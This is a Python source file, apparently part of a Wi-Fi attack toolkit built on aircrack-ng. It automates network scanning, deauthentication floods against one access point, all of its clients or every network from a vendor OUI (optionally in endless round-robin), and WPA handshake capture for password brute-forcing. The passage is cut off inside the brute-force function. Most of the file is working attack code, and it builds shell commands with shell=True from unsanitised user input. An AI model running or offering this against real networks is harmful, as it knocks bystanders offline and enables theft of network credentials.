#!/usr/bin/env python

import os
import signal
import subprocess
import time
import re
import keyboard
import glob

terminals = ['x-terminal-emulator', 'gnome-terminal', 'konsole', 'xfce4-terminal']


def clear():
    """
    runs clear command in shell

    clear command is used to clear the terminal screen
    """
    subprocess.run('clear')


def ansi_escape_red(string):
    """
    inputs a string and returns it with the color red

    use when in need for errors during print commands

    param string
    """
    return f'\033[91m{string}\033[0m'


def ansi_escape_green(string):
    """
    inputs a string and returns it with the color green

    use when in need for better visibility during print commands

    param string
    """
    return f'\033[92m{string}\033[0m'


def output_ansi_management(output):
    """
    This function processes the raw output from airodump to extract only the most recent network information
    displayed on the terminal.

        Airodump updates the terminal view with new data by using ANSI escape codes, effectively refreshing the
        screen. Before each refresh, it uses a specific pattern '\x1b[0K\n\x1b[0J\x1b[2;1H\x1b[22m\x1b' to clear
        the previous information, and this function uses this pattern to identify and retain only the latest data.
        Similarly, the end of the standard output is marked by another pattern '\x1b[0K\n\x1b[0J\x1b[?25h',
        which this function removes.

        Basically

        when I save the output from airodump using subprocess.Popen(..., stdout=subprocess.PIPE) and output =
        airodump.communicate() the output has all the information from airodump at second = 0 up to seconds = 10
        where I kill the process

        what we see on screen is an illusion of old text being deleted and new one being
        written to screen, but it's all done with ansi escape

        you can examine this with print(repr(output)), just printing the output with print(output) would look
        normal since terminal understands the ansi and hides the information beyond this pattern
        '\x1b[0K\n\x1b[0J\x1b[2;1H\x1b[22m\x1b'

        everything is fine when printing but this becomes a problem when I want to deal with the output variable like
        managing the data inside. that's why I only want the latest information visible to us on terminal screen

        '\x1b[0K\n\x1b[0J\x1b[?25h' this is the pattern at the end of the output file from and this
        '\x1b[0K\n\x1b[0J\x1b[2;1H\x1b[22m\x1b' is the start pattern for each new airodump refresh

        so if I get the all the data starting from latest '\x1b[0K\n\x1b[0J\x1b[2;1H\x1b[22m\x1b' up to
        '\x1b[0K\n\x1b[0J\x1b[?25h' it will return only the latest airodump refresh with no duplicates

        BUT THIS PATTERN ONLY APPLIES TO THE OUTPUT FILE RETRIEVED FROM get_airodump_output()

        and if we are dealing with output file retrieved from get_devices_in_AP_output() (a different output file
        from get_airodump_output())  the end pattern becomes '\x1b[0K\n\x1b[0K\x1b[1B\x1b[0J\x1b[?25h' if no devices
        exist, pattern changes too I made an end+start pattern format for possible scenarios



        Parameters:
        - output (str): The raw output from airodump.

        Returns:
        str: The processed output containing only the latest network information visible on the terminal.
    """

    if '\x1b[0K\n\x1b[0J\x1b[?25h' in output:

        if '\x1b[0K\n\x1b[0J\x1b[2;1H\x1b[22m\x1b' in output:
            start_pattern = '\x1b[0K\n\x1b[0J\x1b[2;1H\x1b[22m\x1b'
            end_pattern = '\x1b[0K\n\x1b[0J\x1b[?25h'
            end_index = output.rfind(end_pattern)
            start_index = output.rfind(start_pattern, 0, end_index)
            if end_index == -1 or start_index == -1:
                print('unknown pattern error 1')
                return
            else:
                cleaned_data = output[start_index:end_index]
                return cleaned_data

    if 'Probes\x1b[0K\n\x1b[0K\x1b[1B\x1b[0J\x1b[?25h' in output:
        if '\n\x1b[0K\x1b[1B\x1b[0J\x1b[2;1H\x1b[22m\x1b[37m' in output:
            start_pattern = '\n\x1b[0K\x1b[1B\x1b[0J\x1b[2;1H\x1b[22m\x1b[37m'
            end_pattern = 'Probes\x1b[0K\n\x1b[0K\x1b[1B\x1b[0J\x1b[?25h'
            end_index = output.rfind(end_pattern)
            start_index = output.rfind(start_pattern, 0, end_index)
            if end_index == -1 or start_index == -1:
                print('unknown pattern error 2')
                return
            else:
                return None

    if '\x1b[0K\n\x1b[0J\x1b[?25h' in output:
        if '\x1b[0K\n\x1b[0J\x1b[2;1H\x1b[22m\x1b' in output:
            start_pattern = '\x1b[0K\n\x1b[0J\x1b[2;1H\x1b[22m\x1b'
            end_pattern = '\x1b[0K\n\x1b[0J\x1b[?25h'
            end_index = output.rfind(end_pattern)
            start_index = output.rfind(start_pattern, 0, end_index)
            if end_index == -1 or start_index == -1:
                print('unknown pattern error 3')
                return
            else:
                cleaned_data = output[start_index:end_index]
                return cleaned_data


def get_all_ssid_from_output(output):
    output = output_ansi_management(output)

    SSIDS = []
    try:
        for row in output.split('\n'):
            column = row.split()
            if len(column) >= 12 and not str(column[10]) == 'AUTH' and not str(column[10]) == 'PSK' and not str(
                    column[10]).startswith('<length:') and not str(column[10]).startswith('0>:'):
                SSIDS.append(column[10])
        return SSIDS
    except AttributeError:
        print("There was a problem managing the output file. try again")
        print(AttributeError)
        return


def scan_for_networks(interface):
    """
    inputs a string and returns it with the color green

    use when in need for better visibility during print commands

    :param interface: user selected interface from the main.py

    CALLS: 0

    CALLED BY: main.py

    Depends on (uses) :
        - get_airodump_output(interface)

    """
    output = get_airodump_output(interface)
    SSIDS = get_all_ssid_from_output(output)
    for ssid in SSIDS:
        print(ssid)
    if output and 'Failed initializing wireless card(s)'.lower() not in output.lower():

        print('==================================================================================================\n')
        while 1:
            targetAP = input(' Select a AP (SSID/ESSID) : ').strip()
            if targetAP in SSIDS:
                return targetAP
            if targetAP == '999':
                return
            else:
                print(f'Selected AP ({ansi_escape_green(targetAP)}) does not exist. was it a mistype?')
                print(f'Type {ansi_escape_green("999")} to cancel AP selection')
    else:
        print('==================================================================================================\n')
        print(f'This message is from {ansi_escape_green("scan_for_networks")}')
        print(f'There is a problem with {ansi_escape_red("get_airodump_output")}')
        print(ansi_escape_red(output))
        input(f'input anything to return to previous function \n')


def get_bssid_and_station_from_ap(interface, target_ap):
    """
    now we are dealing with data like this

    this is the duplicate data in the output file. actual output variable has much more duplicates then just 3 mentioned here

    see the  output_ansi_management(output) functions documentation to see why that happens

    ['\x1b[0K\x1b[1B\x1b[0J\x1b[2;1H\x1b[22m\x1b[37m', 'CH', '5', '][', 'Elapsed:', '0', 's', '][', '2024-03-02', '11:06', '\x1b[0K']
    ['\x1b[0K\x1b[1B', 'BSSID', 'PWR', 'Beacons', '#Data,', '#/s', 'CH', 'MB', 'ENC', 'CIPHER', 'AUTH', 'ESSID\x1b[0K']
    ['\x1b[0K\x1b[1B', 'BSSID', '-31', '4', '0', '0', '3', '360', 'WPA3', 'CCMP', 'SAE', 'ESSID', '\x1b[0K']
    ['\x1b[0K\x1b[1B', 'BSSID', 'STATION', 'PWR', 'Rate', 'Lost', 'Frames', 'Notes', 'Probes\x1b[0K']
    ['\x1b[0K\x1b[1B\x1b[0J\x1b[2;1H\x1b[22m\x1b[37m', 'CH', '5', '][', 'Elapsed:', '0', 's', '][', '2024-03-02', '11:06', '\x1b[0K']
    ['\x1b[0K\x1b[1B', 'BSSID', 'PWR', 'Beacons', '#Data,', '#/s', 'CH', 'MB', 'ENC', 'CIPHER', 'AUTH', 'ESSID\x1b[0K']
    ['\x1b[0K\x1b[1B', 'BSSID', '-31', '4', '0', '0', '3', '360', 'WPA3', 'CCMP', 'SAE', 'ESSID', '\x1b[0K']
    ['\x1b[0K\x1b[1B', 'BSSID', 'STATION', 'PWR', 'Rate', 'Lost', 'Frames', 'Notes', 'Probes\x1b[0K']
    ['\x1b[0K\x1b[1B\x1b[0J\x1b[2;1H\x1b[22m\x1b[37m', 'CH', '5', '][', 'Elapsed:', '0', 's', '][', '2024-03-02', '11:06', '\x1b[0K']
    ['\x1b[0K\x1b[1B', 'BSSID', 'PWR', 'Beacons', '#Data,', '#/s', 'CH', 'MB', 'ENC', 'CIPHER', 'AUTH', 'ESSID\x1b[0K']
    ['\x1b[0K\x1b[1B', 'BSSID', '-31', '4', '0', '0', '3', '360', 'WPA3', 'CCMP', 'SAE', 'ESSID', '\x1b[0K']
    ['\x1b[0K\x1b[1B', 'BSSID', 'STATION', 'PWR', 'Rate', 'Lost', 'Frames', 'Notes', 'Probes\x1b[0K']

    even though we have duplicates
    i can just say that `find where row[-2] == targetAP` return row[1],row[6] if len(row[1]) == 17`


    :param interface:
    :param target_ap:
    :return:
    """

    def recursion():
        while 1:
            selection = input('Rerun the Scan  Y/N ').lower()
            if selection == 'y':
                return get_bssid_and_station_from_ap(interface, target_ap)
            elif selection == 'n':
                print(
                    '===============================================================================================\n')
                print(
                    f'this message is from {ansi_escape_green("get_BSSID_and_Station_from_AP")} '
                    f'No {ansi_escape_red("BSSID")} and {ansi_escape_red("CHANNEL")} will be returned '
                    f'this may cause issues if this function was called from another function \n')
                return None
            return

    clear()
    print('Airodump is running. Wait a while for it to complete')
    airodump = subprocess.Popen(f'airodump-ng -N {target_ap} {interface}', shell=True, preexec_fn=os.setsid,
                                stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    time.sleep(3)
    clear()
    os.killpg(airodump.pid, signal.SIGTERM)
    airodump.wait()
    output, error = airodump.communicate()
    if output:
        output = output.decode(encoding='latin-1')
        if 'Failed initializing wireless card(s)' in output:
            print(f'Scan was not successful due to {ansi_escape_green(interface)} being {ansi_escape_red("DOWN")}')
            print(f'{ansi_escape_red("AIRODUMP-NG STDOUT ::")}\n{ansi_escape_red(str(output))}')
            recursion()
        elif target_ap not in output:
            print(
                f'Scan was successful but {ansi_escape_green(target_ap)} is not found with airodump. '
                f'check if its still live')
            recursion()
        for column in output.split('\n'):
            row = column.split()

            if row[-2] and row[1]:
                if row[-2] == target_ap and len(row[1]) == 17:
                    return row[1], row[6]

    else:
        print(
            f'there was a issue running {ansi_escape_red("airodump-ng")}, check interface. if everything is okay rerun')
        recursion()


def deauth(interface, target_ap, interval=0, time_limit=0):
    """
    CALLS:
        : get_BSSID_and_Station_from_AP :


    CALLED BY: main.py


    :param interface: Wi-Fi interface used in aircrack
    :type interface: string
    :param target_ap:


    :param interval: by default aireplay runs until user closes it. if interval != 0 then it will run for interval seconds then quit
    this option is needed for functions that loop multiple SSIDs in order to Deauth them all (for example : Deauth_By_OUI)
    for example if interval == 30. and 2 SSID exist and user wants to deauth both and quit each SSID will be deauthed for 30 seconds
    :type interval: integer

    :param time_limit: by default aireplay runs until user closes it. or if interval time is up. but for limiting the
    Deauthentication from infinite to a limited time for a single SSID, this parameter is used
    for example if user gives DEAUTH(interface,targetAP,timeLimit=15) the deauth will run for 15 seconds

    :type time_limit: integer
    :return:
    """
    try:
        targetAP_BSSID, targetAP_channel = get_bssid_and_station_from_ap(interface, target_ap)

        switch_channel = subprocess.Popen(f'iwconfig {interface} channel {targetAP_channel}', shell=True)
        switch_channel.wait()

        if interval:

            for terminal in terminals:
                clear()
                aireplay = subprocess.Popen(f'{terminal} -e aireplay-ng --deauth 0 -a {targetAP_BSSID} {interface}',
                                            shell=True, preexec_fn=os.setsid)
                interval_time = interval
                while interval_time > 0:
                    print(
                        f"Deauthenticating {ansi_escape_green(target_ap)}. Remaining time {ansi_escape_green(interval_time)} Press Q repeatedly to cancel")
                    if keyboard.is_pressed('q'):
                        print("Loop canceled by user.")
                        interval_time = 1
                    time.sleep(1)
                    interval_time -= 1
                try:
                    os.killpg(aireplay.pid, signal.SIGTERM)
                    aireplay.wait()

                except ProcessLookupError:
                    print(f"IGNORE THIS ERROR IF EVERYTHING IS WORKING FINE {ansi_escape_red(ProcessLookupError)}")
                return

        elif time_limit:
            for terminal in terminals:
                aireplay = subprocess.Popen(f'{terminal} -e aireplay-ng --deauth 0 -a {targetAP_BSSID} {interface}',
                                            shell=True, preexec_fn=os.setsid)
                time.sleep(time_limit)
                try:
                    os.killpg(aireplay.pid, signal.SIGTERM)
                    aireplay.wait()

                except ProcessLookupError:
                    print(
                        f"This error occurs when airodump terminates unexpectedly {ansi_escape_red(ProcessLookupError)}")
                return

        else:
            for terminal in terminals:
                aireplay = subprocess.Popen(f'{terminal} -e aireplay-ng --deauth 0 -a {targetAP_BSSID} {interface}',
                                            shell=True, preexec_fn=os.setsid, )
                aireplay.wait()
                return

    except TypeError:
        print('==================================================================================================\n')
        print(f'This message is from {ansi_escape_green("Deauth")}')
        print(f'There is a problem with {ansi_escape_red("get_BSSID_and_Station_from_AP")}')
        input(f'input anything to return to previous function \n')


def get_devices_in_ap_output(interface, target_ap):
    """

    runs airodump with :param interface: on a specific SSID (:param targetAP:) to get all devices connected to that SSID

    CALLS: 0

    CALLED BY:
        :scan_devices_in_AP_Select_Device:
        :deauth_devices_in_targetAP:
    :return: OUTPUT of airodump
    """
    try:
        targetAP_BSSID, targetAP_channel = get_bssid_and_station_from_ap(interface, target_ap)
        airodump = subprocess.Popen(f'airodump-ng -c {targetAP_channel} --bssid {targetAP_BSSID} {interface}',
                                    shell=True, preexec_fn=os.setsid, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        time.sleep(15)
        clear()
        os.killpg(airodump.pid, signal.SIGTERM)
        airodump.wait()
        output, error = airodump.communicate()
        if isinstance(output, bytes):
            clear()
            output = output.decode(encoding='latin-1')

            return output
    except TypeError:

        print('==================================================================================================\n')
        print(f'This message is from {ansi_escape_green("scan_devices_in_AP")}')
        print(f'There is a problem with {ansi_escape_red("get_BSSID_and_Station_from_AP")}')
        input(f'input anything to return to previous function \n')


def scan_devices_in_ap_select_device(interface, target_ap):
    """
    :param interface:
    :param target_ap:
    :return:
    """

    output = get_devices_in_ap_output(interface, target_ap)
    if not output:

        print('==================================================================================================\n')
        print(f'This message is from {ansi_escape_green("scan_devices_in_AP_Select_Device")}')
        print(f'There is a problem with {ansi_escape_red("scan_devices_in_AP")}')
        input('input anything to return to previous function \n')
        return ''
    else:
        clear()
        print(output, '\n')
        target_device = input('type the Station of the target device : ')

        def check_if_selected_device_exist(target_device, output):
            if target_device in output and target_device != '':
                return target_device
            else:
                print(f'{target_device} is not in the devices of this AP. Was it a mistype?')
                target_device = input('Retype the Station (type 999 to return to previous section: ')
                if target_device == '999':
                    return ''
                else:
                    check_if_selected_device_exist(target_device, output)

        check_if_selected_device_exist(target_device, output)
        return ''


def deauth_selected_device(interface, target_device, target_ap):
    try:
        global terminals

        targetAP_BSSID, targetAP_channel = get_bssid_and_station_from_ap(interface, target_ap)

        switch_channel = subprocess.Popen(f'iwconfig {interface} channel {targetAP_channel}', shell=True)
        switch_channel.wait()

        for terminal in terminals:
            aireplay = subprocess.Popen(
                f'{terminal} -e aireplay-ng --deauth 0 -a {targetAP_BSSID} -c {target_device} {interface}', shell=True)
            aireplay.wait()
            return
    except TypeError:
        print('==================================================================================================\n')
        print(f'This message is from {ansi_escape_green("deauth_selected_device")}')
        print(f'There is a problem with {ansi_escape_red("get_BSSID_and_Station_from_AP")}')
        input(f'input anything to return to previous function \n')


def get_airodump_output(interface):
    def recursion():
        while 1:
            selection = input('Rerun the Scan  Y/N ').lower()
            if selection == 'y':
                return get_airodump_output(interface)
            elif selection == 'n':
                print(
                    '===============================================================================================\n')
                print(
                    f'this message is from {ansi_escape_green("get_airodump_output")} '
                    f'No {ansi_escape_red("Output")} will be returned '
                    f'this may cause issues if this function was called from another function \n')
                return

    clear()
    print('Airodump is running. Wait a while for it to complete')
    airodump = subprocess.Popen('airodump-ng {}'.format(interface), shell=True,
                                preexec_fn=os.setsid, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    time.sleep(15)
    clear()
    os.killpg(airodump.pid, signal.SIGTERM)
    airodump.wait()

    output, error = airodump.communicate()
    if isinstance(output, bytes):
        output = output.decode(encoding='latin-1')
        if 'Failed initializing wireless card(s)'.lower() in output.lower():
            print(f'INTERFACE ERROR {ansi_escape_red(output)}')
            recursion()
        else:

            return output
    else:
        error.decode(encoding='latin-1')
        print(
            f'there was a issue running {ansi_escape_red("airodump-ng")}, check interface. if everything is okay rerun')
        print(f'ERROR {ansi_escape_red(error)}')
        recursion()


def get_airodump_output_oui_formatted(interface):
    """
    th

    param interface
    """

    def recursion():
        while 1:
            selection = input('Rerun the Scan  Y/N ').lower()
            if selection == 'y':
                return get_airodump_output_oui_formatted(interface)
            elif selection == 'n':
                print(
                    '===============================================================================================\n')
                print(
                    f'this message is from {ansi_escape_green("get_airodump_output_OUI_formatted")} '
                    f'No {ansi_escape_red("OUI_output")} will be returned '
                    f'this may cause issues if this function was called from another function \n')
                return
            return

    clear()
    print("OUIFormatter.sh is running. wait until it completes the scan (20s) ")

    shell = subprocess.run(f'./shell_scripts/OUIFormatter.sh {interface}', shell=True, capture_output=True, text=True)
    oui_output, oui_output_error = shell.stdout, shell.stderr
    clear()
    if 'Failed initializing wireless card(s)'.lower() in oui_output.lower():
        print(f'INTERFACE ERROR {ansi_escape_red(oui_output)}')
        recursion()
    if oui_output_error:
        print(
            f'there was a issue running {ansi_escape_red("OUIFormatter.sh")} '
            f'check interface. if everything is okay rerun')
        print(f'ERROR {ansi_escape_red(oui_output_error)}')

        print(oui_output)
        print(
            'an error occurred but If you see networks above then there is no problem (check above before the networks to see the error)')
        selection = input('Rerun the Scan  Y/N ').lower()
        while selection != 'y' or selection != 'n':
            if selection == 'y':
                get_airodump_output_oui_formatted(interface)
            elif selection == 'n':
                return oui_output
    else:
        return oui_output


def scan_for_networks_by_oui_select_router(interface):
    oui_output = get_airodump_output_oui_formatted(interface)
    print(oui_output)
    print('==================================================================================================\n')
    while 1:
        target_oui = input("Select an OUI from the output").replace(" ",
                                                                    "")
        if target_oui in oui_output and len(
                target_oui) == 8:

            return target_oui
        elif target_oui == '999':
            return
        else:
            print(len(target_oui))
            print(f'Selected OUI ({ansi_escape_green(target_oui)}) does not exist. was it a mistype?')
            print(f'Type {ansi_escape_green("999")} to cancel OUI selection')


def remove_ansi_escape_codes(input_text):
    ansi_escape = re.compile(r'\x1b\[[0-9;]*m')
    return ansi_escape.sub('', input_text)


def get_ssid_from_oui(output, target_oui):
    ssids = []
    lines = output.split('\n')
    current_oui = None
    for line in lines:
        if line.startswith("OUI:"):
            current_oui = line.split()[1]
        elif current_oui == target_oui and "{" in line:
            ssid_start_index = line.find("{") + 1
            ssid_end_index = line.find("}", ssid_start_index)
            ssid = line[ssid_start_index:ssid_end_index].strip()
            if ssid:
                ssids.append(ssid)
    return [ssid for ssid in ssids if ssid]


def deauth_by_oui(interface, target_oui):
    oui_output = get_airodump_output_oui_formatted(interface)
    oui_output = remove_ansi_escape_codes(oui_output)
    SSIDs_in_oui_output = get_ssid_from_oui(oui_output, target_oui)
    if SSIDs_in_oui_output:
        print(f"List of SSIDs in {target_oui}")
        for SSID in SSIDs_in_oui_output:
            print(f"{ansi_escape_green(SSID)}")
        print("=====================================",
              " 1   : Deauth all SSIDs once and quit",
              " 2   : Deauth all SSIDs roundrobin",
              " 999 : Quit")
        while 1:
            selection = input("Choose an option : ")
            if selection == '999':
                return
            elif selection == '1':
                for SSID in SSIDs_in_oui_output:
                    deauth(interface, SSID, interval=True)
                return
            elif selection == '2':
                rr_counter = 0
                while 1:
                    for SSID in SSIDs_in_oui_output:
                        clear()
                        print(f"Deauthing {SSID}")
                        deauth(interface, SSID, interval=True)
                    rr_counter += 1
                    print(
                        f"each SSID in {ansi_escape_green(target_oui)} has been Deauthenticated for {ansi_escape_green(rr_counter)} times")
                    print(
                        f"moving to round {ansi_escape_green(rr_counter + 1)} in 3 seconds. Press 'q' to cancel")
                    if keyboard.is_pressed('q'):
                        print("Loop canceled by user.")
                        return
                    time.sleep(3)
    else:
        print(f"No SSID found in f{target_oui}")
    return


def deauth_devices_in_target_ap(interface, target_ap):
    output = get_devices_in_ap_output(interface, target_ap)
    print(output)
    output = output_ansi_management(output)
    if output is None:
        print(
            f'If you see Airodump output above (BSSID,STATION,PWR,...) then the scan was successful '
            f'However it appears there are no devices connected to {ansi_escape_green(target_ap)}')
        print(
            f'If you {ansi_escape_red("dont")} see Airodump output '
            f'then there is a problem with {ansi_escape_red("output_ansi_management")}')
        print(
            f'If that`s the case then uncomment the print(repr(output)) 3 lines above this message in the source code '
            f'and check the ansi escape output and check '
            f'if start/end pattern exist in {ansi_escape_red("output_ansi_management")}')
        print(f'and contact me on {ansi_escape_green("github")}')
        input(f'input anything to return to previous function \n')
        return

    if output and 'Failed initializing wireless card(s)'.lower() not in output.lower():
        devices = []

        for column in output.split('\n'):
            row = column.split()
            ''' AT THIS POINT the Data is formatted like this 
               ['\x1b[0K']                                                                                                                                                                                                                                 
               ['\x1b[0J\x1b[2;1H\x1b[22m\x1b[37m', 'CH', '3', '][', 'Elapsed:', '6', 's', '][', '2024-02-29', '19:08', '\x1b[0K']                                                                                                                         
               ['\x1b[0K\x1b[1B', 'BSSID', 'PWR', 'RXQ', 'Beacons', '#Data,', '#/s', 'CH', 'MB', 'ENC', 'CIPHER', 'AUTH', 'ESSID\x1b[0K']                                                                                                                  
               ['\x1b[0K\x1b[1B', 'TargetAP MAC address', '-28', '100', '55', '3', '0', '3', '360', 'WPA2', 'CCMP', 'PSK', '{targetAP}', '\x1b[0K']                                                                                               
               ['\x1b[0K\x1b[1B', 'BSSID', 'STATION', 'PWR', 'Rate', 'Lost', 'Frames', 'Notes', 'Probes\x1b[0K']                                                                                                                                           
               ['\x1b[0K\x1b[1B', 'TargetAP MAC address', 'Station of device(1) in target AP}', 'X', 'X', 'X', 'X','X']  
               ['\x1b[0K\x1b[1B', 'TargetAP MAC address', 'Station of device(2) in target AP}', 'X', 'X', 'X', 'X']  
               ['\x1b[0K\x1b[1B', 'TargetAP MAC address', 'Station of device(3) in target AP}', 'X', 'X', 'X', 'X','X','X'] maximum of 9 elements in a given row
               
               mac address is 17 chars long and in 2nd index of the row  
               
            '''
            if len(row) >= 3 and len(row[2]) == 17:
                devices.append(row[2])

        if devices:
            print(
                f'{ansi_escape_green(str(len(devices)))} DEVICE MAC ADDRESS(ES) found on {ansi_escape_green(target_ap)}')
            for device in devices:
                print(ansi_escape_green(device))
            print("=====================================",
                  " 1   : Deauth all devices once and quit",
                  " 2   : Deauth all devices roundrobin",
                  " 999 : Quit")
            while 1:
                selection = input("Choose an option : ")
                if selection == '999':
                    return
                elif selection == '1':
                    for device in devices:
                        deauth_selected_device(interface, device, target_ap)
                    return
                elif selection == '2':
                    rr_counter = 0
                    while 1:
                        for device in devices:
                            clear()
                            print(f"Deauthing {device}")
                            deauth_selected_device(interface, device, target_ap)
                        rr_counter += 1
                        print(
                            f"each SSID in {ansi_escape_green(device)} has been Deauthenticated for {ansi_escape_green(rr_counter)} times")
                        print(
                            f"moving to round {ansi_escape_green(rr_counter + 1)} in 3 seconds. Press 'q' to cancel")
                        if keyboard.is_pressed('q'):
                            print("Loop canceled by user.")
                            return
                        time.sleep(3)
    else:
        print('==================================================================================================\n')
        print(f'This message is from {ansi_escape_green("deauth_devices_in_targetAP_with_interval")}')
        print(f'There is a problem with {ansi_escape_red("get_devices_in_AP_output")}')
        input(f'input anything to return to previous function \n')
        return


def get_ssi_ds_with_psk_authentication_from_output(output):
    """
    can only be used with the output variable returned from get_airodump_output()
    :param output: variable returned from get_airodump_output()
    :return: list of SSIDs where authentication is 'PSK'
    """
    output = output_ansi_management(output)
    if output is None:
        print(f'there is a problem with f{ansi_escape_red("output_ansi_management(output)")}')
        print(
            f'probably a new update to {ansi_escape_green("aircrack-ng package")} '
            f'was made that changed the ansi pattern on stdout'
            f'or the pattern is not recognized in output_ansi_management(output)')
        print(f'Create a issue on {ansi_escape_green("github")}.')
        input(f'input anything to return : ')
        return
    authentications = []
    for column in output.split('\n'):
        row = column.split()
        ''' AT THIS POINT the Data is formatted like this                                                                                                                
         ['BSSID', '-73', '2', '0', '0', '4', '130', 'WPA2', 'CCMP', 'PSK', 'ESSID, '\x1b[0K']
         ['BSSID', '-73', '2', '0', '0', '4', '130', 'WPA2', 'CCMP', 'PSK', 'ESSID, '\x1b[0K']
         ['BSSID', '-73', '2', '0', '0', '4', '130', 'WPA2', 'CCMP', 'PSK', 'ESSID, '\x1b[0K']
         ['BSSID', '-73', '2', '0', '0', '4', '130', 'WPA2', 'CCMP', 'PSK', 'ESSID, '\x1b[0K']
                                                                            
        '''
        if len(row) >= 12 and row[-3] == ('PSK' or 'psk'):
            authentications.append(row[-2])
    return authentications


def remove_files_with_prefix(directory, prefix):
    pattern = os.path.join(directory, prefix + '*')

    files_to_remove = glob.glob(pattern)

    for file_path in files_to_remove:
        try:
            os.remove(file_path)
            print(f"Removed {file_path}")
        except FileNotFoundError:
            print(f"File {file_path} was not found (it may have been removed already).")
        except Exception as e:
            print(f"Error removing {file_path}: {e}")
    return


def capture_handshake(interface, target_ap):
    """
    https://www.aircrack-ng.org/doku.php?id=cracking_wpa

    runs airodump-ng with aireplay-ng in order to get the handshake
    and saves the capture file to /tmp/{targetAP}-handshakeCapture/

    if no handshake is found deletes all the files in /tmp/{targetAP}-handshakeCapture/



    :param interface:
    :param target_ap:
    :return:
    """

    def recursion():
        """
         when I implement the same logic in else section of {if matched: else:} below
         once a user presses Y 5 times the user then has to press N 5 times in order to return to main menu
         also if user presses Y any times then a handshake is captured instead of just returning to main menu
         it returns to previous recursive call and asks the user Y/N again

         with this when user inputs 'N' at any given time it will break out of the recursive calls
         and return to network attacks menu
        :return:
        """
        selection = input('\n Do you want to try again Y/N : ').lower()
        while 1:
            if selection == 'y':
                capture_handshake(interface, target_ap)
            elif selection == 'n':
                return
            return

    output = get_airodump_output(interface)
    if output is None:
        print(
            f'If you see Airodump output above (BSSID,STATION,PWR,...) then the scan was successful '
            f'However it appears there are no devices connected to {ansi_escape_green(target_ap)}')
        print(
            f'If you {ansi_escape_red("dont")} see Airodump output '
            f'then there is a problem with {ansi_escape_red("get_airodump_output")}')
        input(f'input anything to return to previous function \n')
        return

    if output and f'{target_ap}'.lower() not in output.lower() and 'Failed initializing wireless card(s)'.lower() not in output.lower():
        print(ansi_escape_red(f'Airodump did not find the f{target_ap} in its scan'))
        print(f'Check if {ansi_escape_green(target_ap)} is active')
        input('input anything to return to network attacks : ')
        return

    elif output and 'Failed initializing wireless card(s)'.lower() not in output.lower():
        authentications = get_ssi_ds_with_psk_authentication_from_output(output)
        if target_ap in authentications:
            BSSID, CHANNEL = get_bssid_and_station_from_ap(interface, target_ap)
            for terminal in terminals:
                clear()
                print(f'Running packet capture on {ansi_escape_green(target_ap)}')
                print(
                    f'Switching channel on  {ansi_escape_green(interface)} to {ansi_escape_green(CHANNEL)}')
                switch_channel = subprocess.Popen(f'iwconfig {interface} channel {CHANNEL}', shell=True)
                switch_channel.wait()
                print(f'Running aireplay on new terminal {ansi_escape_green(target_ap)}')

                print(f'Running airodump on this terminal {ansi_escape_green(target_ap)}')

                target_directory = f'/tmp/{target_ap}-handshakeCapture'
                os.makedirs(target_directory, exist_ok=True)

                airodump_handshake_capture_location = f'/tmp/{target_ap}-handshakeCapture/{target_ap}'

                print(f'Writing Capture files to /tmp/{target_ap}-handshakeCapture/')
                aireplay = subprocess.Popen(f'{terminal} -e aireplay-ng --deauth 0 -a {BSSID} {interface}', shell=True,
                                            preexec_fn=os.setsid)
                airodump = subprocess.Popen(
                    f'airodump-ng --bssid {BSSID} -c {CHANNEL} -w {airodump_handshake_capture_location} {interface}',
                    shell=True, preexec_fn=os.setsid, stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE)

                time.sleep(30)

                os.killpg(airodump.pid, signal.SIGTERM)

                airodump_output = ''
                try:
                    airodump_output, error = airodump.communicate()
                    airodump_output = airodump_output.decode(encoding='latin-1')
                    airodump.wait()
                except ProcessLookupError:
                    print('airodump killed unexpectedly', ProcessLookupError)

                try:
                    os.killpg(aireplay.pid, signal.SIGTERM)
                    aireplay.wait()
                except ProcessLookupError:
                    print('aireplay killed unexpectedly', ProcessLookupError)

                pattern = re.compile(r'handshake:')

                match = pattern.search(airodump_output)
                if match:
                    clear()
                    print(f"\nHandshake capture {ansi_escape_green('SUCCESSFUL')}")
                    print(f"Handshake is saved in '/tmp/{target_ap}-handshakeCapture/'")
                    input('input anything to return to network attacks menu')
                    return

                else:
                    clear()
                    print(f'Handshake capture {ansi_escape_red("FAILED")}')
                    print(
                        'Remember that in order to capture the handshake '
                        'a device must try to connect to the target SSID')
                    print(
                        'Reason for no handshake might be that no device was deauthenticated. '
                        'Try changing the timeout variable of this script in the source code')
                    print(
                        'Or it might be that the deauthenticated devices did not try to reconnect to the SSID '
                        '(might happen if only a small amount of devices are connected to target SSID)')
                    remove_files_with_prefix(f'/tmp/{target_ap}-handshakeCapture',
                                             f'{target_ap}')
                    os.rmdir(f'/tmp/{target_ap}-handshakeCapture')
                    recursion()
                    return

        else:

            print(
                f'{ansi_escape_green(target_ap)} is not authenticated with {ansi_escape_green("PSK")} '
                f'it was not in the list provided by {ansi_escape_green("get_authentication_from_airodump_output")} ')
            print(f'Here is the list of other SSIDs where the authentication is {ansi_escape_green("PSK")}')
            print("\n=======================================================================================\n")
            for ap in authentications:
                print(ansi_escape_green(ap))
            print("\n=======================================================================================\n")
            print("\n=======================================================================================\n")
            input(
                f"Press enter to return to Network attacks menu. "
                f"and select any other network from the list above they all use {ansi_escape_green('PSK')}")
            return

    else:
        print('==================================================================================================\n')
        print(f'This message is from {ansi_escape_green("capture_handshake")}')
        print(f'There is a problem with {ansi_escape_red("get_devices_in_AP_output")}')
        input(f'input anything to return to previous function \n')
        return


def bruteforce_handshake_capture(interface, target_ap):
    """

    :param interface:
    :param target_ap:
    :return:
    """
    BSSID, STATION = get_bssid_and_station_from_ap(interface, target_ap)

    search_pattern = f'/tmp/{target_ap}-handshakeCapture/{target_ap}*.cap'
    matches = glob.glob(search_pattern)
    if matches:
        while 1:
            clear()
            print(f'{ansi_escape_green(len(matches))} captures for the {ansi_escape_green(target_ap)} found')
            print(f'this software deletes the capture files that do not contain the handshake')
            print(
                f'so if the capture files were created using this software then all of the capture files should '
                f'contain the handshake\n')
            for match in matches:
                print(ansi_escape_green(match))
            print('\n')

            print(
                f'If the handshake was captured using besside then the capture file is either {ansi_escape_green(f"/tmp/{target_ap}-besside/wpa.cap")} or {ansi_escape_green(f"/tmp/{target_ap}-besside/wep.cap")}')
            print(
                f'If you dont know which one to use then open them using {ansi_escape_green("wireshark")} '
